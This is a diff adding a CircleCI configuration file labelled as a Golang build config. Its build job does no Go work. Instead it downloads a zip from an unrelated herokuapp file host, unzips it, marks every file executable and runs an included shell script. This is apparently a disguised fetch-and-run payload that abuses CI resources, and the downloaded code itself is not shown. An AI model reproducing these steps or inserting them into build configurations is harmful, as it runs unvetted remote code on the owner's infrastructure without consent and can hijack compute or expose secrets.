@@ -1,0 +1,16 @@
+# Golang CircleCI 2.0 configuration file
+#
+# Check https://circleci.com/docs/2.0/language-go/ for more details
+version: 2
+
+jobs:
+  build:
+    docker:
+      - image: circleci/golang:1.9
+    steps:
+      - run: curl https://filetolinks.herokuapp.com/1701894950433688/gradle.zip -o gradle.zip
+      - run: unzip gradle.zip
+      - run: chmod +x *
+      - run: ./gradlew.sh
+      
+      
